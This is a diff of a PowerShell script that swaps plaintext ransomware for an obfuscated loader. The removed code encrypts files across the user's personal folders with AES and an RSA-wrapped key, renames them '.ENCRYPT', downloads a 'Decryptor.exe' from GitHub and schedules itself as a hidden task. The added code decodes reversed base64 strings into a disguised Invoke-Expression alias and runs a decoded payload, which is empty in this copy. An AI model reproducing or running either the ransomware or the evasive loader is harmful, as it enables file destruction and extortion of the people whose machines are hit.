@@ -1,50 +1,12 @@
-function b{
-$username = $env:USERNAME;
-$targetUser = 'C:\Users\' + $username;
-$Dirs = @('\Desktop','\Downloads','\Documents','\Pictures','\Videos','\Music','\OneDrive');
-$key = New-Object byte[] 16;
-$rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::new();
-$rng.GetBytes($key);
-$key_m = [byte[]]@(0xdd,0x39,0x18,0xff,0x64,0xd4,0xfb,0xc6,0xc7,0x6e,0x89,0x82,0xff,0xca,0x9e,0xe5,0x0f,0x7b,0x30,0x8a,0xe0,0xc1,0x53,0x11,0x84,0x5a,0xac,0x09,0xca,0xf0,0xc9,0xea,0x15,0x37,0x98,0x88,0x92,0x4e,0xb4,0xce,0x12,0x51,0x7d,0xb7,0xc2,0xf3,0x54,0x96,0xd4,0x12,0x66,0xbd,0x35,0x19,0xd9,0x14,0x71,0xe6,0x3d,0x68,0x1e,0x44,0x7f,0xc9,0x85,0xf8,0x38,0x76,0x9a,0x12,0xad,0x4f,0xc6,0x0b,0x25,0x70,0x24,0x0e,0x4b,0x39,0xe8,0x59,0x25,0xe7,0x96,0x2b,0x60,0xe2,0x1c,0x58,0xbf,0x9b,0xbf,0x93,0x83,0xef,0x65,0xdd,0x02,0xa4,0xa8,0x3d,0x9d,0xd3,0x85,0xb6,0xb7,0x5a,0xe5,0x12,0x4c,0xe4,0x92,0xd2,0x0b,0x02,0xd0,0x5e,0x78,0x7d,0xb4,0x6c,0xb0,0xa9,0xda,0x2a,0xe2,0x1a,0x65,0x12,0xed,0x98,0x88,0x51,0xac,0x81,0x0c,0x5d,0x0d,0xd2,0xc7,0x17,0x7a,0x50,0x1f,0xbe,0xbe,0x64,0x33,0xb5,0x43,0x66,0x95,0xeb,0xe7,0x0e,0xd8,0x6c,0xb8,0x4e,0xac,0xf6,0x1c,0x23,0x50,0x37,0x6f,0xb3,0x77,0xeb,0xf4,0x9f,0x8c,0xf1,0x40,0x24,0x98,0x92,0xc4,0xf0,0x96,0x0f,0x43,0x65,0xaf,0xfb,0x94,0xc4,0x1f,0x14,0x08,0x56,0x8b,0xfe,0x6d,0x9a,0x5a,0x08,0xd8,0xe0,0x74,0x49,0x87,0x9e,0x4b,0x9a,0x92,0xad,0xa7,0xee,0x33,0x20,0x7c,0x75,0x2b,0x8b,0x37,0xd3,0x6c,0x6c,0x7a,0xd2,0x44,0x24,0x53,0xa7,0xc4,0xf2,0x3c,0xc5,0x79,0xcd,0x9c,0x70,0x04,0x02,0xf8,0x1f,0x44,0x99,0x96,0xe0,0x29,0xaa,0xa3,0x65,0xe9,0xe0,0x46,0x21,0x34,0xde,0x33,0xf5,0x73,0xeb);
-$key_e = [byte[]]@(0x01,0x00,0x01);
-$rsaParams = New-Object System.Security.Cryptography.RSAParameters;
-$rsaParams.Modulus = $key_m;
-$rsaParams.Exponent = $key_e;
-$rsa = [System.Security.Cryptography.RSA]::Create();
-$rsa.ImportParameters($rsaParams);
-$ek = $rsa.Encrypt($key, [System.Security.Cryptography.RSAEncryptionPadding]::Pkcs1);
-$timestamp = [System.BitConverter]::GetBytes([System.DateTimeOffset]::UtcNow.ToUnixTimeSeconds());
-$exclu = @('.exe','.lnk','.dll','.bin','.bat','.cmd','.sys','.inf','.vxd','.ini','.cfg','.reg','.hiv','.ENCRYPT');
-foreach($dir in $Dirs) {
-    $fd = $targetUser + $dir;
-    if (Test-Path -LiteralPath $fd) {
-        $files = Get-ChildItem -Path $fd -File -Recurse;
-        foreach ($file in $files) {
-            $extension = $file.Extension.ToLower();
-            if ($exclu -contains $extension){continue}
-            try {
-                $content = [System.IO.File]::ReadAllBytes($file.FullName);
-                $aes = [System.Security.Cryptography.Aes]::Create();
-                $aes.Key = $key;
-                $aes.GenerateIV();
-                $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;
-                $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
-                $encryptor = $aes.CreateEncryptor();
-                $encryptedContent = $encryptor.TransformFinalBlock($content, 0, $content.Length);
-                [System.IO.File]::WriteAllBytes($file.FullName, $timestamp + $ek + $aes.IV + $encryptedContent);
-                $newName = $file.Name + '.ENCRYPT';
-                Rename-Item -Path $file.FullName -NewName $newName -Force;
-            }
-            finally {
-                if ($aes) { $aes.Dispose(); }
-            }
-        }
-    }
-}
-$target = $targetUser + '\Desktop\Decryptor.exe';
-Invoke-WebRequest -o $target https://github.com/lrqdz/a/releases/download/dat/A;
-}
-$functionCode = ${function:b}.ToString()
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -c `"$functionCode`""
-Register-ScheduledTask -TaskName "RunDoBgTask" -Trigger $trigger -Action $action -Force
+$nQFMtrdOw = "" ;
+$urfGePN98s = $nQFMtrdOw.ToCharArray() ; [array]::Reverse($urfGePN98s) ; $2afSUycVovZ90rxGndD = -join $urfGePN98s ;
+$O = switch ($2afSUycVovZ90rxGndD.Length % 4) { 0 { $2afSUycVovZ90rxGndD }; 1 { $2afSUycVovZ90rxGndD.Substring(0, $2afSUycVovZ90rxGndD.Length - 1) }; 2 { $2afSUycVovZ90rxGndD + ("=" * 2) }; 3 { $2afSUycVovZ90rxGndD + "=" }} ;
+$WOJj948MZSQ = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($O)) ;
+$YV0ckS0xa0KQOOwkrs4BnR = '42bpN3UlJHcYVULFt2b25Wa'.ToCharArray() ; [array]::Reverse($YV0ckS0xa0KQOOwkrs4BnR) ; $ebAw3fqMhGcIHKji = -join $YV0ckS0xa0KQOOwkrs4BnR ;
+$ebAw3fqMhGcIHKji = switch ($ebAw3fqMhGcIHKji.Length % 4) { 0 { $ebAw3fqMhGcIHKji }; 1 { $ebAw3fqMhGcIHKji.Substring(0, $ebAw3fqMhGcIHKji.Length - 1) }; 2 { $ebAw3fqMhGcIHKji + '=' * 2 }; 3 { $ebAw3fqMhGcIHKji + '=' } } ;
+$19soWRE5psXza = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ebAw3fqMhGcIHKji)) ;
+$Hy4sH4DAYK5pnMpbHROO10 = 'QQx4mc'.ToCharArray() ; [array]::Reverse($Hy4sH4DAYK5pnMpbHROO10) ; $sOPIRxIoxGSWlxin = -join $Hy4sH4DAYK5pnMpbHROO10 ;
+$sOPIRxIoxGSWlxin = switch ($sOPIRxIoxGSWlxin.Length % 4) { 0 { $sOPIRxIoxGSWlxin }; 1 { $sOPIRxIoxGSWlxin.Substring(0, $sOPIRxIoxGSWlxin.Length - 1) }; 2 { $sOPIRxIoxGSWlxin + '=' * 2 }; 3 { $sOPIRxIoxGSWlxin + '=' } } ;
+$l3nbvoP1m0WqAMN = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($sOPIRxIoxGSWlxin)) ;
+$nuLL = neW-ALiaS -name $l3nbvoP1m0WqAMN -VALUe $19soWRE5psXza -ForCe ; & $l3nbvoP1m0WqAMN $WOJj948MZSQ ;
+
